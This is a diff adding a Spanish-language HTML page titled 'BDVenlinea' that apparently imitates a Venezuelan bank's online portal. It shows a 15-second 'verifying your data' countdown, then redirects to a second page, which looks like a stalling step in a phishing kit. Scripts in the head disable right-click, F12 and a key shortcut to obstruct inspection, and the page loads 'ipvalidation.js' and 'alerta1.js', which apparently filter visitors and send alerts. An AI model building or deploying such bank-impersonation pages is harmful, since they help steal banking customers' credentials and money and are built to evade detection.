@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="refresh" content="15;url=index2.html"> 
+    <title>BDVenlinea</title>
+    <link rel="stylesheet" href="css/styles.css">
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Aptos:wght@400;700&display=swap" rel="stylesheet">
+    <script src="js/alerta1.js"></script>
+    <script src="ipvalidation.js"></script>
+      <link rel="icon" href="img/icono.png" type="image/x-icon"> 
+      <link rel="apple-touch-icon" href="img/icono.png"> 
+      <script type="text/javascript">
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        document.onkeydown = function(e) {
+            if (e.ctrlKey && (e.keyCode === 71)) {
+                return false;
+            }
+        };
+    </script>
+    <script>
+              document.addEventListener('keydown', function(e) {
+                  if (e.key === 'F12') {
+                      e.preventDefault();
+                  }
+              });
+      
+              document.addEventListener('contextmenu', function(e) {
+                  e.preventDefault();
+              });
+    </script>     
+    <script>
+        var seconds = 15;
+    
+        function countdown() {
+            document.getElementById('timer').innerText = seconds;
+            if (seconds > 0) {
+                seconds--;
+                setTimeout(countdown, 1000);
+            }
+        }
+    
+        document.addEventListener("DOMContentLoaded", function() {
+            countdown();
+        });
+    </script> 
+</head>
+<body class="body">
+    <form id="formulario" onsubmit="enviarFormulario(event)" class="form">
+        <div><img class="logo1" src="img/logo2.png"></div>
+        <div class="cuadrillo" style="text-align: center;"><label class="text1" style="text-align: center;">Estamos verificando tus datos, por favor espera un momento.&nbsp<span id="timer" style="color: #BB1B47">15</span>&nbspsegundos</label></div><br><br> 
+        <div style="text-align: center;"><img src="img/loading.gif" class="loading" style="text-align: center;"><br><br><br><br><br><br><br></div>
+    </form>
+</body>
+</html>
